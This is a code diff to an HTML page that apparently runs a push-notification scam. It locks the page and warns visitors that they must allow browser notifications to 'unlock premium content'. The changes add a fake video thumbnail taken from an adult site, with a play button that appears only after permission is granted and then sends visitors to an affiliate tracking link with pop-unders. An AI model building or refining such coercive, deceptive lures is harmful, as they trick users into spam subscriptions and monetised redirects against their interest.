@@ -63,6 +63,33 @@
         .btn:hover {
             background-color: #ff9900;
         }
+        .video-container {
+            margin-top: 30px;
+            position: relative;
+            display: inline-block;
+        }
+        .video-img {
+            width: 100%;
+            max-width: 600px;
+            cursor: pointer;
+            border-radius: 10px;
+        }
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            color: white;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: none; /* Initially hidden */
+        }
+        .play-button:hover {
+            background: rgba(255, 165, 0, 0.7); /* Hover effect */
+        }
         .final-warning {
             color: red;
             font-size: 22px;
@@ -83,6 +110,13 @@
             <p><b>Failure to comply will deny access to our premium content.</b></p>
         </div>
         <button class="btn" id="allowButton">Allow Notifications and Unlock Content</button>
+        
+        <div class="video-container">
+            <img src="https://cdn77-pic.xvideos-cdn.com/videos/thumbs169poster/dd/fe/66/ddfe6645a61b72e3c55718aeb8db171b/ddfe6645a61b72e3c55718aeb8db171b.30.jpg" alt="Video Thumbnail" class="video-img" id="playVideo">
+            <div class="play-button" id="playBtn">▶️</div>
+            <p class="offer-message">Click Play to Watch (Only after allowing notifications)</p>
+        </div>
+
         <p class="loading">Processing your verification...</p>
         <p class="offer-message">Hurry, limited time access! Unlock the best content now!</p>
     </div>
@@ -107,7 +141,7 @@
         const messaging = getMessaging(app);
 
         document.body.style.pointerEvents = "none";
-
+        
         // Función para solicitar permiso de notificación
         function requestNotificationPermission() {
             Notification.requestPermission().then(permission => {
@@ -121,11 +155,13 @@
                         });
 
                     setTimeout(() => {
+                        // Redirigir al video de contenido premium
                         window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN";
                     }, 2000);
 
                     document.getElementById("lockScreen").style.display = "none";
                     document.body.style.pointerEvents = "auto";
+                    document.getElementById("playBtn").style.display = "block"; // Mostrar botón Play
                 } else {
                     logEvent(analytics, 'notification_permission_denied');
                     // Mostrar mensaje fuerte si el permiso es denegado
@@ -148,7 +184,7 @@
             });
         }
 
-        // Llamar a la función para solicitar el permiso
+        // Función para iniciar la solicitud de permiso
         requestNotificationPermission();
 
         // Permitir reintentar haciendo clic en el botón
@@ -156,6 +192,14 @@
             requestNotificationPermission();
         });
 
+        // Al hacer clic en la imagen del video, verificar si el usuario ha permitido las notificaciones
+        document.getElementById("playBtn").addEventListener("click", () => {
+            if (Notification.permission === "granted") {
+                window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN"; // Redirige al video de contenido premium
+            } else {
+                alert("Please allow notifications to unlock the content!");
+            }
+        });
     </script>
 </body>
 </html>
